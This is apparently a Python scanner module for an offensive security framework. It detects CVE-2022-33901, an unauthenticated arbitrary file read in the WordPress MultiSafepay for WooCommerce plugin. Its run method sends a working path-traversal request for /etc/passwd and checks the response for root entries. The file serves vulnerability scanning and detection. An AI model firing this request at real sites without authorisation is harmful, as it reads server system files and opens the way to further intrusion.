#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress MultiSafepay for WooCommerce plugin through 4."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress MultiSafepay for WooCommerce <=4.13.1 - Arbitrary File Read Detection',
        'description': 'WordPress MultiSafepay for WooCommerce plugin through 4.13.1 contains an arbitrary file read vulnerability. An attacker can potentially obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'wp-plugin', 'wp', 'wordpress', 'unauth', 'multisafepay', 'woocommerce', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wordpress.org/plugins/multisafepay/',
            'https://wordpress.org/plugins/multisafepay/#developers',
            'https://patchstack.com/database/vulnerability/multisafepay/wordpress-multisafepay-plugin-for-woocommerce-plugin-4-13-1-unauthenticated-arbitrary-file-read-vulnerability',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-33901',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2022-33901',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-admin/admin-ajax.php?action=admin_init&log_filename=../../../../../../../../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_any = ('application/octet-stream',)
        body_regexes = ('root:.*:0:0:',)
        if (any(m in headers for m in header_any)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="WordPress MultiSafepay for WooCommerce <=4.13.1 - Arbitrary File Read detected",
                path='/wp-admin/admin-ajax.php?action=admin_init&log_filename=../../../../../../../../../../../../../etc/passwd',
            )
            return True
        return False

